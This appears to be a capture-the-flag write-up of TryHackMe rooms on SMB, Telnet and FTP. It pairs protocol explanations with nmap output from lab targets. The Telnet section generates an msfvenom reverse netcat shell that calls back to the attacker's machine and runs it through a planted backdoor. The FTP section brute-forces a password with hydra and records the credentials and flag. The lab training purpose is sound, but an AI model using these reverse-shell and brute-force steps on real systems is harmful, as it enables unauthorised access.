# SMB

## What is SMB?

SMB: Server Message Block Protocol: is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [source]

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. 
Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. 
Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

How does SMB work?

Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. 
However, in the case of SMB, these things are done over the network.

What runs SMB?

Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. 
Samba, an open source server that supports the SMB protocol, was released for Unix systems.

## SMB enumeration

Enumeration

Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.

SMB

Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information: you'd be surprised what is sometimes included on these shares.

Port Scanning

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.

If you haven't already looked at port scanning, I recommend checking out the Nmap room here.

Enum4Linux

Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official github.

The syntax of Enum4Linux is nice and simple: "enum4linux [options] ip"

TAG            FUNCTION

-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-a             all of the above (full basic enumeration)

##  Port scanning

1st scan: 
sudo nmap -sV -sS 10.10.37.41
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-31 10:53 GMT
Nmap scan report for 10.10.37.41
Host is up (0.014s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X: 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X: 4.X (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.70 seconds

2nd scan:
nmap -sT -A 10.10.37.41 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-31 11:15 GMT
Nmap scan report for 10.10.37.41
Host is up (0.027s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 91df5c7c26226e9023a77dfa5ce1c252 (RSA)
|   256 8657f52af7869ccf02c1acbc34906b01 (ECDSA)
|_  256 81e3cce7c93c75d7fbe086a001417781 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X: 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2022-10-31T11:15:48
|_  start_date: N/A
|_nbstat: NetBIOS name: POLOSMB, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: polosmb
|   NetBIOS computer name: POLOSMB\x00
|   Domain name: \x00
|   FQDN: polosmb
|_  System time: 2022-10-31T11:15:48+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds

Enum4linux scan was inconclusive due to openvpn issues, scan from AttackBox in enumerating-smb.log

# Telnet

## Enumerating Telnet

Tried multiple scans with no success, missing piece was the `-p-` scanning all ports and not just the first 1000

Found the port with:
```
nmap -sT -p- 10.10.49.152 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 10:00 GMT
Nmap scan report for 10.10.49.152
Host is up (0.017s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8012/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
```

then found that the port is skidy's backdoor with:

```
sudo nmap -sS -sV -p8012 10.10.153.43
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 10:11 GMT
Nmap scan report for 10.10.153.43
Host is up (0.0099s latency).

PORT     STATE SERVICE VERSION
8012/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.93%I=7%D=11/1%Time=6360F0CA%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20command
SF:s\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\
SF:x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\
SF:x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20BA
SF:CKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRequest,
SF:2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n
SF:")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view
SF:\x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Ty
SF:pe\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"SK
SF:IDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(H
SF:elp,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comman
SF:ds\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20t
SF:o\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKDOO
SF:R\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2E,
SF:"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%
SF:r(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x2
SF:0commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\
SF:x20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x20T
SF:ype\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"SKI
SF:DY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LP
SF:DString,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20co
SF:mmands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\
SF:x20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.\x
SF:20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY'S
SF:\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LANDes
SF:k-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comma
SF:nds\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x2
SF:0to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20
SF:\.HELP\x20to\x20view\x20commands\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.88 second
```

## Exploiting Telnet

connected to the telnet port with: 

`telnet 10.10.153.43 8012`

tried using .RUN to execute commands, no apparent success

started a tcpdump listener on tun0 (vpn), for local connection listen on eth0

`sudo tcpdump ip proto \\icmp -i tun0`

used the telnet connection to ping attack machine (.RUN ping <attackIP> -c 1)

tcpdump registered the ping

generated a reverse shell payload with msfvenom (-p payload, R is raw output)

`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

started netcat listener on port 444 on attack machine

ran generated payload in telnet console 

shell access on machine

# FTP

## What is FTP?

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

How does FTP work?
A typical FTP session operates using two channels:

    a command (sometimes called the control) channel
    a data channel. 

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

Active vs Passive

The FTP server may support either Active or Passive connections, or both. 

    In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
    In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it.  

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

More Details:

You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: https://www.ietf.org/rfc/rfc959.txt. The IETF is one of a number of standards agencies, who define and regulate internet standards.

## Enumerating FTP

First scan found only the FTP port but the answer to the first question (how many open ports) isn't one so ran a second scan
```
nmap -sT -sV -p- 10.10.30.162
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 16:47 GMT
Nmap scan report for 10.10.30.162
Host is up (0.0099s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
Service Info: Host: Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.56 seconds
```

Second scan revealed anonymous access was possible but no other ports
```
nmap -sC -sV -p- 10.10.30.162
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 16:48 GMT
Nmap scan report for 10.10.30.162
Host is up (0.011s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.7.163
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
Service Info: Host: Welcome

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.80 seconds
```
Third scan reveals the http port
```
nmap -Pn0-9999 10.10.30.162
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 16:54 GMT
Nmap scan report for 10.10.30.162
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

Connected with ftp anonymous and found potential admin username in txt file

## Exploiting FTP

Using hydra and the username found in the txt file we get credentials to access the ftp (mike : password) and get the flag 
THM{y0u_g0t_th3_ftp_fl4g}
